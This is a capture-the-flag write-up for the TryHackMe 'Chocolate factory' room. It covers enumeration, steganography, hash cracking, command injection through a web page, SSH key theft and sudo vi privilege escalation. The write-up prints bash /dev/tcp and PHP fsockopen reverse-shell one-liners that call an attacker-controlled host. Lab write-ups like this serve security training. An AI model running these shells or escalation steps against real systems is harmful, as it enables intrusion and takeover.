# Chocolate factory

At: [TryHackMe](https://tryhackme.com/room/chocolatefactory)
By: [0x9747](https://tryhackme.com/p/0x9747) [saharshtapi](https://tryhackme.com/p/saharshtapi) [AndyInfoSec](https://tryhackme.com/p/AndyInfoSec)

IP: 10.10.186.21

## ENUM

I tend to start with an nmap scan, rustscan is a great "alternative" (it also uses nmap)

### NMAP

`nmap -sC -sV -vv -oN nmap.txt 10.10.186.21`

Let's break it down:
`-sC` starts nmap with default scripts, and yes! Nmap has an NSE scripting engine. Very cool
</br>
`-sV` makes nmap enumerate services for their versions
</br>
`-vv` sets the output to very verbose
</br>
`-oN nmap.txt` writes a log to nmap.txt

Output: (this one will be massive)
```
21/tcp  open  ftp        syn-ack ttl 63 vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.147.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh        syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
|   256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
80/tcp  open  http       syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?   syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?    syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?      syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?      syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?   syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?     syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, HTTPOptions, Kerberos, NULL, RPCCheck, afp: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?      syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map? syn-ack ttl 63
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

```

So yeah... alot of these are dead ends probably. So which returned fine?
```
21 ftp
80 http
22 ssh
```
I'm gonna try logging into `ftp`

## FTP

```bash
$ ftp $IP

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
```
Welp, time for stego!

## Steganography

Use `steghide`:

```
$ steghide --extract -sf gum_room.jpg 
Enter passphrase: 
wrote extracted data to "b64.txt".
```
Funny enough, no password, just press enter. And `b64.txt` is definitely a `base64` encoded file, time to decode it!
`cat b64.txt | base64 -d` and that gives us a limited `/etc/passwd` output!
```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
Nice, but I'm not sure if we can crack this

## Hash cracking

```
$ hashcat --force -a 0 -m 1800 hash /usr/share/wordlists/rockyou.txt
```
I have to use the `--force` option, because I don't have an OpenCL GPU. 
*I couldn't crack this in a reasonable time space, so if you don't have an OpenCL GPU try the web based method :)*

## WEB

At the same time I looked at the website and ran `gobuster`:
```
$ ~/go/bin/gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.186.21
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/25 14:56:35 Starting gobuster
===============================================================
/home.php (Status: 200)

```
Nice! Time to check out `/home.php`

### home.php

We have a online command line.... time to try some basic commands.
Enter `ls`:
```
home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
```
Nice! Time to look at the key and `validate.php`. Start with the key:
```
cat key_rev_key // and then Ctrl + U to view source
```
And you get Charlies key.

Then the tricky one:
```
cat validate.php
```
and press Ctrl + U right away to view the source
```php
</form>
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password="REDACTED"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
?></body>
```
Shebang! Creds! 

#### Reverse shell

Hey, since we have command execution, lets actually get on the machine:
```bash
bash -i >& /dev/tcp/YOUR_VPN_IP/8888 0>&1
```
if that doesn't work, try:
```php
php -r '$sock=fsockopen("YOUR_VPN_IP",8888);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

and start a `netcat` listener: `nc -lvnp 8888`. Perfect! We are `www-data`! 

Now ofcourse, you could have skipped the whole thing and go straight for reverse shell, but I like to play around :)

## USER

So how do we get to charlie? We have a password, but nope, not right. Look into his `/home/` directory.

We cannot access the user.txt flag, but we can get the ssh private key. Get it back to your machine (I just used `cat` and literally copied the output to a file `id_rsa`) and then:
```sh
$ chmod 600 id_rsa 
$ ssh charlie@$IP -i id_rsa 
```

And bang we are charlie! Get your flag and time to look at privesc.

## Privesc

Run `id` and we get the following output:
```bash
charlie@chocolate-factory:/home/charlie$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
Cool! We are in the sudoers group, run `sudo -l` to see what we can run:
```bash
charlie@chocolate-factory:/home/charlie$ sudo -l 
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```
Even better, this is an easy privesc! We can run `vi` as sudo, and `vi` has the function to run bash commands from inside the program. 

Do the following:
```
$ sudo vi

// press ESC and then type ':!/bin/bash -p'
```
Shebalabung, root! Now what?

## root.py

Cool, we have a function, run it! 
`python root.py`
```
Enter the key: 
```
Now, make sure to input the key in this format: `b'KEY'` and get your flag :)
